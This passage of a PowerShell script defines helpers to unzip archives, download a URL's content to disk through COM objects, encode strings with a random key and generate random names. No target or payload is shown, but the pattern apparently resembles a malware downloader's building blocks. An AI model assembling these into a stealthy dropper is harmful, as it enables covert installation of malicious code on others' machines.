return $sR
}

function Unzip
{
    param([string]$zipfile, [string]$outpath)

$shell = New-Object -ComObject shell.application
$zip = $shell.NameSpace($zipfile)
foreach ($item in $zip.items()) {
  $shell.Namespace($outpath).CopyHere($item)
}
}

Function Down($url, $output){
$http = new-object -com "WinHttp.WinHttpRequest.5.1"
$http.open("GET",$url,$false)
$http.send()

$stm = New-Object -ComObject ADODB.Stream
$stm.open()
$stm.type = 1
$stm.write($http.ResponseBody)
$stm.position = 0;
$stm.SaveToFile($output)
$stm.close();
}

Function aova($s1,$id){
$sx = ""
$x = 0
$x4 = Get-Random -Maximum 25
$sR = [char]($x4+65)
$x4 = ($x4 + $id)

 For ($i=0;$i -lt $s1.length ; $i++) {
 $x = ([int][char]$s1.Substring($i,1)) + $x4
	if ($x -le 25)
	{
	$sx = 'A' + [char]($x+65)
	}else
	   {
           $x2 = 0;
	   $x2 = [math]::truncate($x / 25)
           $x3 = 0;
	   $x3 = $x - ($x2 * 25)
	   $sx = [char][int]($x2+65) 
           $sx = $sx+[char][int]($x3+65)
	   }
   $sR = $sR + $sx
  }
   return $sR
}

Function GeraS($tamanho){
$R = "";

 For ($i=0;$i -lt $tamanho -2 ; $i++) {
 $x2 = 0;
 $x2 = (Get-Random -Maximum (25))+ 65
 $R = $R + [char][int]($x2)
 }
 $R = $R + [char][int]((Get-Random -Maximum (10))+ 48)
 $R = $R + [char][int]((Get-Random -Maximum (10))+ 48)
return $R
}

Function GeraNome($tamanho){
$R = "";
$tamanho = $tamanho + 3
$x1 = Get-Random -Maximum ($tamanho + 2)
 For ($i=0;$i -lt $tamanho ; $i++) {
 $x2 = 0;
 $x2 = (Get-Random -Maximum (25))+ 65
 $R = $R + [char][int]($x2)
 }
return $R
}
